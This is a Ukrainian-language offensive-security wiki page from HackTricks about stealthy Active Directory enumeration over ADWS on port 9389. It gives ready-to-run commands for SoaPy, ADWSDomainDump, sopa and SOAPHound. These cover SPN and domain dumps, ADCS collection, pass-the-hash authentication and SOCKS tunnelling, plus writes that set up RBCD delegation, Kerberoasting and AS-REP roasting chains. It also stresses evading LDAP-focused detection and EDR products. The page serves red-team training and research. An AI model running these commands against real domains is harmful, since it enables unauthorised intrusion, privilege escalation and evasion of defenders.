# Active Directory Web Services (ADWS) Enumeration & Stealth Collection

{{#include ../../banners/hacktricks-training.md}}

## Що таке ADWS?

Active Directory Web Services (ADWS) **увімкнено за замовчуванням на кожному контролері домену, починаючи з Windows Server 2008 R2**, і служба прослуховує TCP-порт **9389**. Попри назву, **HTTP тут не використовується**. Натомість служба надає доступ до даних у стилі LDAP через стек пропрієтарних протоколів .NET для фреймування:<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Оскільки трафік інкапсульовано в цих бінарних SOAP-фреймах і він передається через незвичний порт, **перерахування через ADWS значно рідше перевіряється, фільтрується або виявляється сигнатурами, ніж класичний трафік LDAP/389 і 636**. Для операторів це означає:<sup>[[1]](#references)[[7]](#references)</sup>

* Прихованіша розвідка — Blue Team часто зосереджується на LDAP-запитах.
* Можливість збирати дані з **не-Windows-хостів (Linux, macOS)**, тунелюючи 9389/TCP через SOCKS-проксі.
* Ті самі дані, які можна отримати через LDAP (користувачі, групи, ACL, схема тощо), і можливість виконувати **записи** (наприклад, `msDs-AllowedToActOnBehalfOfOtherIdentity` для **RBCD**).

Взаємодія з ADWS реалізована через WS-Enumeration: кожен запит починається з повідомлення `Enumerate`, яке задає LDAP-фільтр/атрибути й повертає GUID `EnumerationContext`; потім одне або кілька повідомлень `Pull` передають результати порціями розміром до визначеного сервером вікна.<sup>[[7]](#references)</sup> Контексти стають недійсними приблизно через 30 хвилин, тому інструментам потрібно або розбивати результати на сторінки, або розділяти фільтри (запити за префіксами для кожного CN), щоб не втратити стан.<sup>[[8]](#references)</sup> Запитуючи дескриптори безпеки, задайте контроль `LDAP_SERVER_SD_FLAGS_OID`, щоб виключити SACL; інакше ADWS просто вилучить атрибут `nTSecurityDescriptor` із SOAP-відповіді.

> ПРИМІТКА: ADWS також використовується багатьма інструментами RSAT із графічним інтерфейсом/PowerShell, тому трафік може бути схожим на легітимну адміністративну активність.

## SoaPy — нативний клієнт Python

[SoaPy](https://github.com/logangoins/soapy) — це **повна реалізація стека протоколів ADWS на чистому Python**. Вона формує фрейми NBFX/NBFSE/NNS/NMF побайтно, даючи змогу збирати дані з Unix-подібних систем без використання середовища виконання .NET.<sup>[[1]](#references)[[2]](#references)</sup>

### Основні можливості

* Підтримує **роботу через SOCKS-проксі** (корисно для C2-імплантів).
* Детальні пошукові фільтри, ідентичні LDAP `-q '(objectClass=user)'`.
* Необов’язкові операції **запису** ( `--set` / `--delete` ).
* **Режим виводу BOFHound** для прямого імпорту в BloodHound.<sup>[[3]](#references)</sup>
* Прапорець `--parse` для зручного читання часових позначок і `userAccountControl`.<sup>[[2]](#references)</sup>

### Прапорці цільового збору даних і операції запису

SoaPy містить добірку параметрів для виконання найпоширеніших завдань пошуку в LDAP через ADWS: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, а також параметри `--query` / `--filter` для налаштування власних запитів. Їх можна поєднувати з примітивами запису, як-от `--rbcd <source>` (задає `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (підготовка SPN для цільового Kerberoasting) і `--asrep` (вмикає `DONT_REQ_PREAUTH` у `userAccountControl`).<sup>[[2]](#references)</sup>

Приклад цільового пошуку SPN, який повертає лише `samAccountName` і `servicePrincipalName`:

```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
      --spns -f samAccountName,servicePrincipalName --parse
```

Використовуйте той самий хост/облікові дані, щоб негайно використати результати: вивантажте об’єкти, придатні для RBCD, за допомогою `--rbcds`, а потім застосуйте `--rbcd 'WEBSRV01$' --account 'FILE01$'`, щоб підготувати ланцюжок Resource-Based Constrained Delegation (повний шлях зловживання див. у розділі [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

### Встановлення (хост оператора)

```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```

## ADWSDomainDump – LDAPDomainDump через ADWS (Linux/Windows)

* Форк `ldapdomaindump`, який замінює LDAP-запити на виклики ADWS через TCP/9389, щоб зменшити кількість спрацювань на LDAP-підписи.
* Спочатку перевіряє доступність порту 9389, якщо не вказано `--force` (пропускає перевірку, якщо сканування портів викликає підозру або фільтрується).
* У README зазначено, що інструмент успішно обходить Microsoft Defender for Endpoint і CrowdStrike Falcon.<sup>[[4]](#references)</sup>

### Встановлення

```bash
pipx install .
```

### Використання

```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```

Типовий вивід журналу показує перевірку доступності порту 9389, прив’язування ADWS і початок/завершення дампу:

```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

## Sopa — практичний клієнт для ADWS на Golang

Як і soapy, [sopa](https://github.com/Macmod/sopa) реалізує стек протоколів ADWS (MS-NNS + MC-NMF + SOAP) на Golang і надає прапорці командного рядка для виконання викликів ADWS, як-от:<sup>[[5]](#references)</sup>

* **Пошук і отримання об’єктів** — `query` / `get`
* **Життєвий цикл об’єктів** — `create [user|computer|group|ou|container|custom]` і `delete`
* **Редагування атрибутів** — `attr [add|replace|delete]`
* **Керування обліковими записами** — `set-password` / `change-password`
* та інші, як-от `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]` тощо.

### Основні особливості зіставлення протоколів

* Пошук у стилі LDAP виконується через **WS-Enumeration** (`Enumerate` + `Pull`) із проєкцією атрибутів, керуванням областю пошуку (Base/OneLevel/Subtree) і пагінацією.
* Для отримання окремого об’єкта використовується **WS-Transfer** `Get`; для зміни атрибутів — `Put`; для видалення — `Delete`.
* Для створення вбудованих об’єктів використовується **WS-Transfer ResourceFactory**; для користувацьких об’єктів — **IMDA AddRequest**, керований YAML-шаблонами.
* Операції з паролями — це дії **MS-ADCAP** (`SetPassword`, `ChangePassword`).<sup>[[5]](#references)</sup>

### Виявлення метаданих без автентифікації (mex)

ADWS надає доступ до WS-MetadataExchange без облікових даних, що дає змогу швидко перевірити доступність перед автентифікацією:<sup>[[5]](#references)</sup>

```bash
sopa mex --dc <DC>
```

### Нотатки щодо виявлення DNS/DC і вибору цілей Kerberos

Sopa може знаходити DC через SRV, якщо `--dc` не вказано, а `--domain` задано. Вона надсилає запити в такому порядку й використовує ціль із найвищим пріоритетом:<sup>[[5]](#references)</sup>

```text
_ldap._tcp.<domain>
_kerberos._tcp.<domain>
```

Операційно, віддавайте перевагу резолверу під контролем DC, щоб уникнути збоїв у сегментованих середовищах:

* Використовуйте `--dns <DC-IP>`, щоб **усі** SRV/PTR/forward lookups проходили через DNS DC.
* Використовуйте `--dns-tcp`, якщо UDP заблоковано або відповіді SRV завеликі.
* Якщо Kerberos увімкнено, а `--dc` задано як IP-адресу, sopa виконує **зворотний PTR-запит**, щоб отримати FQDN для коректного визначення SPN/KDC. Якщо Kerberos не використовується, PTR-запит не виконується.

Приклад (IP + Kerberos, примусове використання DNS через DC):

```bash
sopa info version --dc 192.168.1.10 --dns 192.168.1.10 -k --domain corp.local -u user -p pass
```

### Варіанти матеріалів автентифікації

Окрім паролів у відкритому тексті, sopa підтримує **NT hashes**, **Kerberos AES keys**, **ccache** і **PKINIT certificates** (PFX або PEM) для автентифікації ADWS. Kerberos використовується автоматично з параметрами `--aes-key`, `-c` (ccache) або параметрами на основі сертифікатів.<sup>[[5]](#references)</sup>

```bash
# NT hash
sopa --dc <DC> -d <DOMAIN> -u <USER> -H <NT_HASH> query --filter '(objectClass=user)'

# Kerberos ccache
sopa --dc <DC> -d <DOMAIN> -u <USER> -c <CCACHE> info domain
```

### Створення власних об’єктів за допомогою шаблонів

Для довільних класів об’єктів команда `create custom` використовує шаблон YAML, який відповідає запиту IMDA `AddRequest`:<sup>[[5]](#references)</sup>

* `parentDN` і `rdn` задають контейнер і відносний DN.
* `attributes[].name` підтримує `cn` або namespaced `addata:cn`.
* `attributes[].type` приймає `string|int|bool|base64|hex` або явний `xsd:*`.
* **Не** додавайте `ad:relativeDistinguishedName` або `ad:container-hierarchy-parent`; sopa вставляє їх автоматично.
* Значення `hex` перетворюються на `xsd:base64Binary`; використовуйте `value: ""`, щоб задати порожній рядок.

## SOAPHound – Збір даних ADWS у великих обсягах (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) — це .NET-збирач, який виконує всі взаємодії з LDAP через ADWS і створює JSON, сумісний із BloodHound v4. Він один раз створює повний кеш `objectSid`, `objectGUID`, `distinguishedName` і `objectClass` (`--buildcache`), а потім повторно використовує його для проходів `--bhdump`, `--certdump` (ADCS) або `--dnsdump` (DNS, інтегрований з AD), тож контролер домену залишають лише ~35 критичних атрибутів. AutoSplit (`--autosplit --threshold <N>`) автоматично розбиває запити на частини за префіксом CN, щоб у великих лісах не перевищити 30-хвилинний час очікування EnumerationContext.<sup>[[8]](#references)</sup>

Типовий робочий процес на операторській VM, приєднаній до домену:

```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
              --autosplit --threshold 1200 --nolaps \
              -o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```

Експортований JSON напряму підходить для workflows SharpHound/BloodHound — див. [методологію BloodHound](bloodhound.md), щоб дізнатися про подальшу побудову графів. AutoSplit робить SOAPHound стійким до роботи з лісами, що містять мільйони об’єктів, і водночас зменшує кількість запитів порівняно зі знімками в стилі ADExplorer.

## Процес прихованого збору даних AD

Наведений нижче процес показує, як через ADWS перерахувати **об’єкти домену й ADCS**, перетворити їх на JSON для BloodHound і шукати шляхи атак на основі сертифікатів — усе з Linux:

1. **Створіть тунель для 9389/TCP** з цільової мережі до своєї машини (наприклад, через Chisel, Meterpreter, динамічне перенаправлення портів SSH тощо). Експортуйте `export HTTPS_PROXY=socks5://127.0.0.1:1080` або скористайтеся параметрами SoaPy `--proxyHost/--proxyPort`.

2. **Зберіть об’єкт кореневого домену:**

```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
      -q '(objectClass=domain)' \
      | tee data/domain.log
```

3. **Зберіть об’єкти, пов’язані з ADCS, із Configuration NC:**

```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
      -dn 'CN=Configuration,DC=ludus,DC=domain' \
      -q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
           (objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
      | tee data/adcs.log
```

4. **Перетворіть на BloodHound:**

```bash
bofhound -i data --zip   # produces BloodHound.zip
```

5. **Завантажте ZIP** у графічному інтерфейсі BloodHound і виконайте cypher-запити, наприклад `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c`, щоб виявити шляхи ескалації через сертифікати (ESC1, ESC8 тощо).

### Запис `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)

```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
      --set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
      msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```

Поєднайте це з `s4u2proxy`/`Rubeus /getticket`, щоб виконати повний ланцюжок **Resource-Based Constrained Delegation** (див. [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## Зведення інструментів

| Призначення | Інструмент | Примітки |
|---------|------|-------|
| Перерахування ADWS | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, читання/запис |
| Масове вивантаження ADWS | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, спочатку кешування, режими BH/ADCS/DNS |
| Імпорт даних у BloodHound | [BOFHound](https://github.com/bohops/BOFHound) | Перетворює журнали SoaPy/ldapsearch |
| Компрометація сертифікатів | [Certipy](https://github.com/ly4k/Certipy) | Можна проксувати через той самий SOCKS |
| Перерахування ADWS і зміна об’єктів | [sopa](https://github.com/Macmod/sopa) | Універсальний клієнт для взаємодії з відомими кінцевими точками ADWS — дає змогу виконувати перерахування, створювати об’єкти, змінювати атрибути та змінювати паролі |

## References

- [1] [SpecterOps – Обов’язково використовуйте SOAP(y): посібник оператора з прихованого збору даних AD через ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
- [2] [SoaPy на GitHub](https://github.com/logangoins/soapy)
- [3] [BOFHound на GitHub](https://github.com/bohops/BOFHound)
- [4] [ADWSDomainDump на GitHub](https://github.com/mverschu/adwsdomaindump)
- [5] [Sopa на GitHub](https://github.com/Macmod/sopa)
- [6] [Microsoft – специфікації MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
- [7] [IBM X-Force Red – Приховане перерахування середовищ Active Directory через ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
- [8] [FalconForce – Інструмент SOAPHound для збору даних Active Directory через ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)
{{#include ../../banners/hacktricks-training.md}}
